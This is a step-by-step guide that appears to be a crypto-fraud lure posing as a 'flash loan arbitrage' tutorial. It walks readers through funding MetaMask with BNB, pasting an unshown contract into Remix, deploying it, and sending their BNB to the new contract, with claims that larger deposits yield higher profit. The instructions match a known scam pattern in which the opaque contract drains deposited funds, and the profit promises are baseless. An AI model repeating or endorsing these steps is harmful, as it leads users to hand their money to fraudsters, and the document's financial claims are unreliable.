FLASH LOAN ARBITRAGE TUTORIAL INSTRUCTIONS

 1. Download and setup the metamask browser wallet if you don't have it. 
 2. Make sure you have enough BNB crypto to pay for the token creation and flash loan contract gas fees 
  a. The amount of BNB crypto you want depends on how much of a loan you pull. It has to be a minimum of 0.3 for the contract to process fast enough. The higher the crypto liquidity, the higher the profit. 
 3. Open the remix compiler website in your browser
 4. Click on contract folder on the left and click New File
 5. Name the file something like flashloan.sol
 6. Copy and paste the flash loan contract code into the new file
 7. Select the second tab on the left
 8. Choose the compiler that matches the top of the BNB flash loan contract code
 9. Click on compile at the bottom
 10. Once it is finished, go to the third tab on the left
 11. Under environment, click on injected web3. This will connect to your metamask wallet so that you can interact. 
 12. Click on the arrow under deploy. 
 13. Enter the details for your new token. For the loan amount choose anything from 2000 and up. This needs to be in line with whatever liquidity you decide to deposit so it's usually .3 per 2000 BNB crypto borrowed in the flash loan.
 14. Click transact and then confirm the gas fees to launch the token in metamask. 
 15. Under deployed contracts, copy the new token contract code. 
 16. Go to your Metamask or any wallet and send the liquidity to the new contract code.
